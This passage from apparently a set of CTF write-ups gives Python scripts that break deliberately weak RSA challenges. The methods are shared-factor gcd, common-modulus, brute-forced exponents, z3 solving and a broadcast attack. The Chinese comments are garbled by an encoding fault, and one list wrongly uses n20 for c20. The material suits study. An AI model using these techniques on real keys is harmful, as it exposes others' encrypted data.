27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299 c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551 c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987 c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837 c15 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451 c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499 c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973 c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603 c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659 c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 n=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20] c=[c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19,n20] for i in range(len(n)): for j in range(len(n)): if(i!=j): if(gmpy2.gcd(n[i],n[j])!=1): print(i,j) p = gmpy2.gcd(n[i],n[j]) q = n[i]//p phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) print(long_to_bytes(pow(c[i],d,n[i]))) [GUET-CTF2019]BabyRSA æ•°å­¦åŸºç¡€\n1 2 3 4 5 6 7 8 9 import gmpy2 from Crypto.Util.number import * pandq = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea pand1plusqand1 = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 e = 0xe6b1bee47bd63f615c7d0a43c529d219 d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5 c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a n = pand1plusqand1-pandq-0x1 print(long_to_bytes(pow(c,d,n))) [BJDCTF 2nd]rsa1 z3ä¸€æŠŠæ¢­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import gmpy2 from z3 import * from Crypto.Util.number import * s = Solver() p = Int(\u0026#39;p\u0026#39;) q = Int(\u0026#39;q\u0026#39;) e=13429379 c=37332862741675346229583169567152164430146499089312685908851183340452190598886333615853155498508415408089581801883370302481709390297776618601480360810070871814397706612573141312688883403426524175246063930832326746678005856762803341556751580794356126079747464232058718190249354501040556617161761929732923280943 s.add(p*p+q*q==238420776178584617049288032161547024466861975342369979628141562234373353220453353664649365343450804384502930281279147426842077646603010195201716387182635666909277032847358758494468148859529242190073633027688389710139393207656988607106191515067517636570736117553740915720326677382496072451079775448599321604322) s.add(p-q==-611654557241875384641098249625799792635443181689527967382700141143931101340384965139162727396181951280954636964792364891275776715479040790020462586306760) s.add(p\u0026gt;0) if s.check() == sat: print(s.model()) q_ = 11219894245840060444506904094146935763848067056819142420884683915798749496281087039417606929306730027157980578915189929943231226763671304112340611018151061 p_ = 10608239688598185059865805844521135971212623875129614453501983774654818394940702074278444201910548075877025941950397565051955450048192263322320148431844301 assert(s.model()[q] == q_) assert(s.model()[p] == p_) n = p_*q_ phi = (p_-1)*(q_-1) d = gmpy2.invert(e, phi) m = gmpy2.powmod(c, d, n) print(long_to_bytes(m)) [NCTF2019]childRSA sieve_baseæ˜¯å‰10000ä¸ªç´ æ•°ï¼Œæ•´èŠ±é‡Œèƒ¡å“¨çš„ï¼Œyafuå¯ä»¥ç›´æ¥åˆ†è§£nå¾—åˆ°p q\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import gmpy2 from random import choice from Crypto.Util.number import isPrime, sieve_base as primes, long_to_bytes # from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u0026lt; bits: n *= choice(primes) if isPrime(n + 1): return n + 1 e = 0x10001 # m = int.from_bytes(flag.encode(), \u0026#39;big\u0026#39;) # p, q = [getPrime(2048) for _ in range(2)] # n = p * q n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 p = 178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 q = 184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867 phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) [HDCTF2019]bbbbbbrsa cè§£å¯†åéƒ½ç›´æ¥ç»™äº†ï¼Œç›´æ¥çˆ†ç ´å°±è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import gmpy2 import base64 from Crypto.Util.number import * p = 177077389675257695042507998165006460849 n = 37421829509887796274897162249367329400988647145613325367337968063341372726061 c = \u0026#34;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM\u0026#34; c = int(base64.b64decode(c[::-1])) q = n/p phi = (p-1)*(q-1) for e in range(50000,70000): if gmpy2.gcd(e, phi)==1: d = gmpy2.invert(e, phi) m = pow(c,d,n) try: flag = long_to_bytes(m) if \u0026#34;{\u0026#34; in flag and \u0026#34;}\u0026#34; in flag: print(flag) break except: print(\u0026#34;e:\u0026#34;,e) [BJDCTF2020]RSA çˆ†ç ´eï¼Œç»™äº†ä¸¤ä¸ªnï¼Œqæ˜¯æœ€å¤§å…¬çº¦æ•°ï¼Œç®€å•æ±‚ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from Crypto.Util.number import getPrime,bytes_to_long,long_to_bytes import gmpy2 # flag=open(\u0026#34;flag\u0026#34;,\u0026#34;rb\u0026#34;).read() # p=getPrime(1024) # q=getPrime(1024) # assert(e\u0026lt;100000) # n=p*q # m=bytes_to_long(flag) # c=pow(m,e,n) # print c,n # print pow(294,e,n) # p=getPrime(1024) # n=p*q # m=bytes_to_long(\u0026#34;BJD\u0026#34;*32) # c=pow(m,e,n) # print c,n \u0026#39;\u0026#39;\u0026#39; output: 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 \u0026#39;\u0026#39;\u0026#39; n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 cflag = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 # for e in range(100000): # if pow(294,e,n1) == 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018: # print(e) # break e = 52361 n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 q = gmpy2.gcd(n1, n2) p = n1/q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) mflag = pow(cflag, d, n1) print(long_to_bytes(mflag)) [BJDCTF2020]rsa_output å…±æ¨¡æ”»å‡»ï¼Œæ‰©å±•æ¬§å‡ é‡Œå¾—\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import gmpy2 from Crypto.Util.number import * n = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111 e1 = 2767 e2 = 3659 c1 = 20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599 c2 = 11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227 assert(gmpy2.gcd(e1,e2)==1) gcd, s, t = gmpy2.gcdext(e1, e2) assert(e1*s+e2*t==1) print(gcd, s, t) s = -s c1 = gmpy2.invert(c1, n) ms = pow(c1, s, n) mt = pow(c2, t, n) m = ms*mt%n # print(m) print(long_to_bytes(m)) [ACTFæ–°ç”Ÿèµ›2020]crypto-rsa0 ç­¾åˆ°é¢˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 from Crypto.Util.number import * import random import gmpy2 e=65537 p = 9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411 q = 7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223 c = 50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) [GWCTF 2019]BabyRSA flagåˆ†æˆä¸¤æ®µï¼Œyafuè§£Nï¼Œz3ä¸€æŠŠæ¢­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 import gmpy2 import sympy from z3 import * from Crypto.Util.number import * # flag = \u0026#39;GWHT{******}\u0026#39; # secret = \u0026#39;******\u0026#39; # assert(len(flag) == 38) # # half = len(flag) / 2 # flag1 = flag[:19] # flag2 = flag[19:] # secret_num = getPrime(1024) * bytes_to_long(secret) # p = sympy.nextprime(secret_num) # q = sympy.nextprime(p) # N = p * q # e = 0x10001 # F1 = bytes_to_long(flag1) # F2 = bytes_to_long(flag2) # m1 = F1 + F2 # m2 = pow(F1, 3) + pow(F2, 3) # assert(m2 \u0026lt; N) # c1 = pow(m1, e, N) # c2 = pow(m2, e, N) # output = open(\u0026#39;secret\u0026#39;, \u0026#39;w\u0026#39;) # output.write(\u0026#39;N=\u0026#39; + str(N) + \u0026#39;\\n\u0026#39;) # output.write(\u0026#39;m1=\u0026#39; + str(c1) + \u0026#39;\\n\u0026#39;) # output.write(\u0026#39;m2=\u0026#39; + str(c2) + \u0026#39;\\n\u0026#39;) # output.close() e = 0x10001 N = 636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163 c1 = 90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239 c2 = 487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546 p = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737 q = 797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699 assert(p*q==N) phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m1 = pow(c1, d, N) m2 = pow(c2, d, N) # print(int(m1)) # 2732509502629189160482346120094198557857912754 # print(int(m2)) # 5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554 s = Solver() f1 = Int(\u0026#39;f1\u0026#39;) f2 = Int(\u0026#39;f2\u0026#39;) s.add(pow(f1,3)+pow(f2,3)==5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554) s.add(f1+f2==2732509502629189160482346120094198557857912754) # if s.check() == sat: # print(s.model()) # [f2 = 1141553212031156130619789508463772513350070909, # f1 = 1590956290598033029862556611630426044507841845] f1 = 1590956290598033029862556611630426044507841845 f2 = 1141553212031156130619789508463772513350070909 flag1 = long_to_bytes(f1) flag2 = long_to_bytes(f2) print(\u0026#34;flag:\u0026#34;, flag1+flag2) [WUSTCTF2020]babyrsa 1 2 3 4 5 6 7 8 9 10 11 12 13 import gmpy2 import sympy from z3 import * from Crypto.Util.number import * c = 28767758880940662779934612526152562406674613203406706867456395986985664083182 n = 73069886771625642807435783661014062604264768481735145873508846925735521695159 e = 65537 p = 189239861511125143212536989589123569301 q = 386123125371923651191219869811293586459 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) RSA4 å¹¿æ’­æ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import gmpy2 from Crypto.Util.number import * def CRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M n = [] c = [] n1 = int(str(331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004),5) c1 = int(str(310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243),5) n2 = int(str(302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114),5) c2 = int(str(112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344),5) n3 = int(str(332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323),5) c3 = int(str(10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242),5) n.extend([n1,n2,n3]) c.extend([c1,c2,c3]) m3 = CRT(n, c) m = gmpy2.iroot(m3, 3)[0] # 